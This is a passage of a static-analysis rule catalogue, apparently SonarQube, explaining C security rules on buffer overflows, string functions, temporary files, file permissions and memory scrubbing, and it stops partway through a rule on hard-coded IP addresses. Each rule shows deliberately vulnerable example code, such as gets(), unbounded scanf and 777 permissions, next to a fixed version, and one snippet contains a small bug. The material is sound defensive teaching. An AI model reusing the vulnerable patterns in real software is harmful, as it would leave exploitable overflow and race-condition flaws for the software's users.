<p>The compiler is generally allowed to remove code that does not have any effect, according to the abstract machine of the C language. This means
that if you have a buffer that contains sensitive data (for instance passwords), calling <code>memset</code> on the buffer before releasing the memory
will probably be optimized away.</p>
<p>The function <a href="https://en.cppreference.com/w/c/string/byte/memset" rel="nofollow"><code>memset_s</code></a> behaves similarly to <code>memset</code>, but
the main difference is that it cannot be optimized away, the memory will be overwritten in all cases. You should always use this function to scrub
security-sensitive data.</p>
<p>This rule raises an issue when a call to <code>memset</code> is followed by the destruction of the buffer.</p>
<p>Note that <code>memset_s</code> is defined in annex K of C11, so to have access to it, you need a standard library that supports it (this can be
tested with the macro <code>__STDC_LIB_EXT1__</code>), and you need to enable it by defining the macro <code>__STDC_WANT_LIB_EXT1__</code> before
including <code>&lt;string.h&gt;</code>. Other platform specific functions can perform the same operation, for instance <a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877%28v&#61;vs.85%29?redirectedfrom&#61;MSDN" rel="nofollow">SecureZeroMemory</a> (Windows)
or <a href="https://www.freebsd.org/cgi/man.cgi?query&#61;explicit_bzero" rel="nofollow">explicit_bzero</a> (FreeBSD)</p>
<h3>Noncompliant code example</h3>
<pre>
void f(char *password, size_t bufferSize) {
  char localToken[256];
  init(localToken, password);
  memset(password, &#39; &#39;, strlen(password)); // Noncompliant, password is about to be freed
  memset(localToken, &#39; &#39;, strlen(localToken)); // Noncompliant, localToken is about to go out of scope
  free(password);
}
</pre>
<h3>Compliant solution</h3>
<pre>
void f(char *password, size_t bufferSize) {
  char localToken[256];
  init(localToken, password);
  memset_s(password, bufferSize, &#39; &#39;, strlen(password));
  memset_s(localToken, sizeof(localToken), &#39; &#39;, strlen(localToken));
  free(password);
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/14" rel="nofollow">MITRE, CWE-14</a> - Compiler Removal of Code to Clear Buffers </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S1079">
              c:S1079
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>The <code>%s</code> placeholder is used to read a word into a string.</p>
<p>By default, there is no restriction on the length of that word, and the developer is required to pass a sufficiently large buffer for storing
it.</p>
<p>No matter how large the buffer is, there will always be a longer word.</p>
<p>Therefore, programs relying on <code>%s</code> are vulnerable to buffer overflows.</p>
<p>A field width specifier can be used together with the <code>%s</code> placeholder to limit the number of bytes which will by written to the
buffer.</p>
<p>Note that an additional byte is required to store the null terminator.</p>
<h3>Noncompliant code example</h3>
<pre>
char buffer[10];
scanf(&#34;%s&#34;, buffer);      // Noncompliant - will overflow when a word longer than 9 characters is entered
</pre>
<h3>Compliant solution</h3>
<pre>
char buffer[10];
scanf(&#34;%9s&#34;, buffer);     // Compliant - will not overflow
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/120" rel="nofollow">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input (&#39;Classic Buffer
  Overflow&#39;) </li><li> <a href="https://cwe.mitre.org/data/definitions/676" rel="nofollow">MITRE, CWE-676</a> - Use of Potentially Dangerous Function </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5443">
              c:S5443
            </a>
          </td>
          <td>
            <details>
              <p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451" rel="nofollow">CVE-2012-2451</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838" rel="nofollow">CVE-2015-1838</a> </li></ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>
<ul><li> <code>/tmp</code> </li><li> <code>/var/tmp</code> </li><li> <code>/usr/tmp</code> </li><li> <code>/dev/shm</code> </li><li> <code>/dev/mqueue</code> </li><li> <code>/run/lock</code> </li><li> <code>/var/run/lock</code> </li><li> <code>/Library/Caches</code> </li><li> <code>/Users/Shared</code> </li><li> <code>/private/tmp</code> </li><li> <code>/private/var/tmp</code> </li><li> <code>\Windows\Temp</code> </li><li> <code>\Temp</code> </li><li> <code>\TMP</code> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Files are read from or written into a publicly writable folder </li><li> The application creates files with predictable names into a publicly writable folder </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use a dedicated sub-folder with tightly controlled permissions </li><li> Use secure-by-design APIs to create temporary files. Such API will make sure:
    <ul><li> The generated filename is unpredictable </li><li> The file is readable and writable only by the creating user ID </li><li> The file descriptor is not inherited by child processes </li><li> The file will be destroyed as soon as it is closed </li></ul>  </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;cstdio&gt;
// ...

void f() {
  FILE * fp &#61; fopen(&#34;/tmp/temporary_file&#34;, &#34;r&#34;); // Sensitive
}
</pre>
<pre>
#include &lt;cstdio&gt;
#include &lt;cstdlib&gt;
#include &lt;sstream&gt;
// ...

void f() {
  std::stringstream ss;
  ss &lt;&lt; getenv(&#34;TMPDIR&#34;) &lt;&lt; &#34;/temporary_file&#34;; // Sensitive
  FILE * fp &#61; fopen(ss.str().c_str(), &#34;w&#34;);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;cstdio&gt;
#include &lt;cstdlib&gt;
// ...

void f() {
  FILE * fp &#61; tmpfile(); // Compliant
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/377" rel="nofollow">MITRE, CWE-377</a> - Insecure Temporary File </li><li> <a href="https://cwe.mitre.org/data/definitions/379" rel="nofollow">MITRE, CWE-379</a> - Creation of Temporary File in Directory with Incorrect Permissions
  </li><li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File" rel="nofollow">OWASP, Insecure Temporary File</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S2612">
              c:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix file system permissions, the &#34;<code>others</code>&#34; category refers to all users except the owner of the file system resource and the
members of the group assigned to this resource.</p>
<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive
information, disrupt services or elevate privileges.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application is designed to be run on a multi-user environment. </li><li> Corresponding files and directories may contain confidential information. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<p>When creating a file or directory with permissions to &#34;other group&#34;:</p>
<pre>
open(&#34;myfile.txt&#34;, O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process set 777 permissions to this newly created file

mkdir(&#34;myfolder&#34;, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process try to set 777 permissions to this newly created directory
</pre>
<p>When explicitly adding permissions to &#34;other group&#34; with <code>chmod</code>, <code>fchmod</code> or <code>filesystem::permissions</code>
functions:</p>
<pre>
chmod(&#34;myfile.txt&#34;, S_IRWXU | S_IRWXG | S_IRWXO);  // Sensitive: the process set 777 permissions to this file

fchmod(fd, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process set 777 permissions to this file descriptor
</pre>
<p>When defining the <code>umask</code> without read, write and execute permissions for &#34;other group&#34;:</p>
<pre>
umask(S_IRWXU | S_IRWXG); // Sensitive: the further files and folders will be created with possible permissions to &#34;other group&#34;
</pre>
<h2>Compliant Solution</h2>
<p>When creating a file or directory, do not set permissions to &#34;other group&#34;:</p>
<pre>
open(&#34;myfile.txt&#34;, O_CREAT, S_IRWXU | S_IRWXG); // Compliant

mkdir(&#34;myfolder&#34;, S_IRWXU | S_IRWXG); // Compliant
</pre>
<p>When using <code>chmod</code>, <code>fchmod</code> or <code>filesystem::permissions</code> functions, do not add permissions to &#34;other group&#34;:</p>
<pre>
chmod(&#34;myfile.txt&#34;, S_IRWXU | S_IRWXG);  // Compliant

fchmod(fd, S_IRWXU | S_IRWXG); // Compliant
</pre>
<p>When defining the <code>umask</code>, set read, write and execute permissions to other group:</p>
<pre>
umask(S_IRWXO); // Compliant: further created files or directories will not have permissions set for &#34;other group&#34;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission" rel="nofollow">OWASP File Permission</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/FIO01-J.&#43;Create&#43;files&#43;with&#43;appropriate&#43;access&#43;permissions" rel="nofollow">CERT, FIO01-J.</a> -
  Create files with appropriate access permissions </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.&#43;Create&#43;files&#43;with&#43;appropriate&#43;access&#43;permissions" rel="nofollow">CERT, FIO06-C.</a> - Create
  files with appropriate access permissions </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S1081">
              c:S1081
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>When using typical C functions, it’s up to the developer to make sure the size of the buffer to be written to is large enough to avoid buffer
overflows. Buffer overflows can cause the program to crash at a minimum. At worst, a carefully crafted overflow can cause malicious code to be
executed.</p>
<p>This rule reports use of the following insecure functions, for which knowing the required size is not generally possible: <code>gets()</code> and
<code>getpw()</code>.</p>
<p>In such cases. The only way to prevent buffer overflow while using these functions would be to control the execution context of the
application.</p>
<p>It is much safer to secure the application from within and to use an alternate, secure function which allows you to define the maximum number of
characters to be written to the buffer:</p>
<ul><li> <code>fgets</code> or <code>gets_s</code> </li><li> <code>getpwuid</code> </li></ul>
<h3>Noncompliant code example</h3>
<pre>
gets(str); // Noncompliant; &#96;str&#96; buffer size is not checked and it is vulnerable to overflows
</pre>
<h3>Compliant solution</h3>
<pre>
gets_s(str, sizeof(str)); // Prevent overflows by enforcing a maximum size for &#96;str&#96; buffer
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/676" rel="nofollow">MITRE, CWE-676</a> - Use of Potentially Dangerous Function </li><li> <a href="https://cwe.mitre.org/data/definitions/119" rel="nofollow">MITRE, CWE-119</a> - Improper Restriction of Operations within the Bounds of a Memory
  Buffer </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5814">
              c:S5814
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strcat( char *restrict dest, const char *restrict src );</code> appends the characters of string <code>src</code> at the
end of <code>dest</code>. The <code>wcscat</code> does the same for wide characters and should be used with the same guidelines.</p>
<p>Note: the functions <code>strncat</code> and <code>wcsncat</code> might look like attractive safe replacements for <code>strcat</code> and
<code>wcscaty</code>, but they have their own set of issues (see <a href="/organizations/sopra-steria/rules?open&#61;c%3AS5815&amp;rule_key&#61;c%3AS5815" rel="nofollow">S5815</a>), and you should probably prefer another more adapted
alternative.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There is a possibility that either the <code>src</code> or the <code>dest</code> pointer is <code>null</code> </li><li> The current string length of <code>dest</code> plus the current string length of <code>src</code> plus 1 (for the final <code>null</code>
  character) is larger than the size of the buffer pointer-to by <code>src</code> </li><li> There is a possibility that either string is not correctly <code>null</code>-terminated </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> C11 provides, in its annex K, the <code>strcat_s</code> and the <code>wcscat_s</code> that were designed as safer alternatives to
  <code>strcat</code> and <code>wcscat</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li><li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li><li> If you are writing C&#43;&#43; code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strcpy(dest, &#34;Result: &#34;);
  strcat(dest, src); // Sensitive: might overflow
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char result[] &#61; &#34;Result: &#34;;
  char *dest &#61; malloc(sizeof(result) &#43; strlen(src)); // Not need of &#43;1 for final 0 because sizeof will already count one 0
  strcpy(dest, result);
  strcat(dest, src); // Compliant: the buffer size was carefully crafted
  int r &#61; doSomethingWith(dest);
  free(dest);
  return r;
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/120" rel="nofollow">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input (&#39;Classic Buffer
  Overflow&#39;) </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ" rel="nofollow">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5813">
              c:S5813
            </a>
          </td>
          <td>
            <details>
              <p>The function <code>size_t strlen(const char *s)</code> measures the length of the string <code>s</code> (excluding the final null character).<br />
The function <code>size_t wcslen(const wchar_t *s)</code> does the same for wide characters, and should be used with the same guidelines.</p>
<p>Similarly to many other functions in the standard C libraries, <code>strlen</code> and <code>wcslen</code> assume that their argument is not a null
pointer.</p>
<p>Additionally, they expect the strings to be null-terminated. For example, the 5-letter string &#34;abcde&#34; must be stored in memory as &#34;abcde\0&#34; (i.e.
using 6 characters) to be processed correctly. When a string is missing the null character at the end, these functions will iterate past the end of
the buffer, which is undefined behavior.</p>
<p>Therefore, string parameters must end with a proper null character. The absence of this particular character can lead to security vulnerabilities
that allow, for example, access to sensitive data or the execution of arbitrary code.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There is a possibility that the pointer is null. </li><li> There is a possibility that the string is not correctly null-terminated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use safer functions. The C11 functions <code>strlen_s</code> and <code>wcslen_s</code> from annex K handle typical programming errors.<br />
  Note, however, that they have a runtime overhead and require more code for error handling and therefore are not suited to every case. </li><li> Even if your compiler does not exactly support annex K, you probably have access to similar functions. </li><li> If you are writing C&#43;&#43; code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
size_t f(char *src) {
  char dest[256];
  strncpy(dest, src, sizeof dest); // Truncation may happen
  return strlen(dest); // Sensitive: &#34;dest&#34; will not be null-terminated if truncation happened
}
</pre>
<h2>Compliant Solution</h2>
<pre>
size_t f(char *src) {
  char dest[256];
  strncpy(dest, src, sizeof dest); // Truncation may happen
  dest[sizeof dest - 1] &#61; 0;
  return strlen(dest); // Compliant: &#34;dest&#34; is guaranteed to be null-terminated
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/120" rel="nofollow">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input (&#39;Classic Buffer
  Overflow&#39;) </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ" rel="nofollow">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5816">
              c:S5816
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strncpy(char * restrict dest, const char * restrict src, size_t count);</code> copies the first <code>count</code>
characters from <code>src</code> to <code>dest</code>, stopping at the first <code>null</code> character, and filling extra space with 0. The
<code>wcsncpy</code> does the same for wide characters and should be used with the same guidelines.</p>
<p>Both of those functions are designed to work with fixed-length strings and might result in a non-<code>null</code>-terminated string.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There is a possibility that either the <code>source</code> or the <code>destination</code> pointer is <code>null</code> </li><li> The security of your system can be compromised if the <code>destination</code> is a truncated version of the <code>source</code> </li><li> The <code>source</code> buffer can be both non-<code>null</code>-terminated and smaller than the <code>count</code> </li><li> The <code>destination</code> buffer can be smaller than the <code>count</code> </li><li> You expect <code>dest</code> to be a <code>null</code>-terminated string </li><li> There is an overlap between the <code>source</code> and the <code>destination</code> </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> C11 provides, in its annex K, the <code>strncpy_s</code> and the <code>wcsncpy_s</code> that were designed as safer alternatives to
  <code>strcpy</code> and <code>wcscpy</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li><li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li><li> If you are using <code>strncpy</code> and <code>wsncpy</code> as a safer version of <code>strcpy</code> and <code>wcscpy</code>, you should
  instead consider <code>strcpy_s</code> and <code>wcscpy_s</code>, because these functions have several shortcomings:
    <ul><li> It’s not easy to detect truncation </li><li> Too much work is done to fill the buffer with 0, leading to suboptimal performance </li><li> Unless manually corrected, the <code>dest</code> string might not be <code>null</code>-terminated </li></ul>  </li><li> If you want to use <code>strcpy</code> and <code>wcscpy</code> functions and detect if the string was truncated, the pattern is the following:
    <ul><li> Set the last character of the buffer to <code>null</code> </li><li> Call the function </li><li> Check if the last character of the buffer is still <code>null</code> </li></ul>  </li><li> If you are writing C&#43;&#43; code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strncpy(dest, src, sizeof(dest)); // Sensitive: might silently truncate
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char dest[256];
  dest[sizeof dest - 1] &#61; 0;
  strncpy(dest, src, sizeof(dest)); // Compliant
  if (dest[sizeof dest - 1] !&#61; 0) {
    // Handle error
  }
  return doSomethingWith(dest);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/120" rel="nofollow">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input (&#39;Classic Buffer
  Overflow&#39;) </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ" rel="nofollow">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5815">
              c:S5815
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strncat( char *restrict dest, const char *restrict src, size_t count );</code> appends the characters of string
<code>src</code> at the end of <code>dest</code>, but only add <code>count</code> characters max. <code>dest</code> will always be
<code>null</code>-terminated. The <code>wcsncat</code> does the same for wide characters, and should be used with the same guidelines.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There is a possibility that either the <code>src</code> or the <code>dest</code> pointer is <code>null</code> </li><li> The current string length of <code>dest</code> plus the current string length of <code>src</code> plus 1 (for the final <code>null</code>
  character) is larger than the size of the buffer pointer-to by <code>src</code> </li><li> There is a possibility that either string is not correctly <code>null</code>-terminated </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> C11 provides, in its annex K, the <code>strncat_s</code> and the <code>wcsncat_s</code> that were designed as safer alternatives to
  <code>strncat</code> and <code>wcsncat</code>. It’s not recommended to use them in all circumstances because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li><li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li><li> If you are using <code>strncat</code> and <code>wsncat</code> as a safer version of <code>strcat</code> and <code>wcscat</code>, you should
  instead consider <code>strcat_s</code> and <code>wcscat_s</code> because these functions have several shortcomings:
    <ul><li> It’s not easy to detect truncation </li><li> The <code>count</code> parameter is error-prone </li><li> Computing the <code>count</code> parameter typically requires computing the string length of <code>dest</code>, at which point other
      simpler alternatives exist </li></ul>  </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strcpy(dest, &#34;Result: &#34;);
  strncat(dest, src, sizeof dest); // Sensitive: passing the buffer size instead of the remaining size
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char result[] &#61; &#34;Result: &#34;;
  char dest[256];
  strcpy(dest, result);
  strncat(dest, src, sizeof dest - sizeof result); // Compliant but may silently truncate
  return doSomethingWith(dest);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/120" rel="nofollow">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input (&#39;Classic Buffer
  Overflow&#39;) </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ" rel="nofollow">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5824">
              c:S5824
            </a>
          </td>
          <td>
            <details>
              <p>The functions &#34;tmpnam&#34;, &#34;tmpnam_s&#34; and &#34;tmpnam_r&#34; are all used to return a file name that does not match an existing file, in order for the
application to create a temporary file. However, even if the file did not exist at the time those functions were called, it might exist by the time
the application tries to use the file name to create the files. This has been used by hackers to gain access to files that the application believed
were trustworthy.</p>
<p>There are alternative functions that, in addition to creating a suitable file name, create and open the file and return the file handler. Such
functions are protected from this attack vector and should be preferred. About the only reason to use these functions would be to create a temporary
folder, not a temporary file.</p>
<p>Additionally, these functions might not be thread-safe, and if you don’t provide them buffers of sufficient size, you will have a buffer
overflow.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There is a possibility that several threads call any of these functions simultaneously </li><li> There is a possibility that the resulting file is opened without forcing its creation, meaning that it might have unexpected access rights
  </li><li> The buffers passed to these functions are respectively smaller than
    <ul><li> <code>L_tmpnam</code> for <code>tmpnam</code> </li><li> <code>L_tmpnam_s</code> for <code>tmpnam_s</code> </li><li> <code>L_tmpnam</code> for <code>tmpnam_r</code> </li></ul>  </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use a function that directly opens the temporary file, such a <code>tmpfile</code>, <code>tmpfile_s</code>, <code>mkstemp</code> or
  <code>mkstemps</code> (the last two allow more accurate control of the file name). </li><li> If you can’t get rid of these functions, when using the generated name to open the file, use a function that forces the creation of the file
  and fails if the file already exists. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *tempData) {
  char *path &#61; tmpnam(NULL); // Sensitive
  FILE* f &#61; fopen(tmpnam, &#34;w&#34;);
  fputs(tempData, f);
  fclose(f);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *tempData) {
  // The file will be opened in &#34;wb&#43;&#34; mode, and will be automatically removed on normal program exit
  FILE* f &#61; tmpfile(); // Compliant
  fputs(tempData, f);
  fclose(f);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/377" rel="nofollow">MITRE, CWE-377</a> - Insecure Temporary File </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/CON33-C.&#43;Avoid&#43;race&#43;conditions&#43;when&#43;using&#43;library&#43;functions" rel="nofollow">CERT, CON33-C.</a> - Avoid
  race conditions when using library functions </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/FIO21-C.&#43;Do&#43;not&#43;create&#43;temporary&#43;files&#43;in&#43;shared&#43;directories" rel="nofollow">CERT, FIO21-C.</a> - Do
  not create temporary files in shared directories </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S1313">
              c:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-5901" rel="nofollow">CVE-2006-5901</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-3725" rel="nofollow">CVE-2005-3725</a> </li></ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
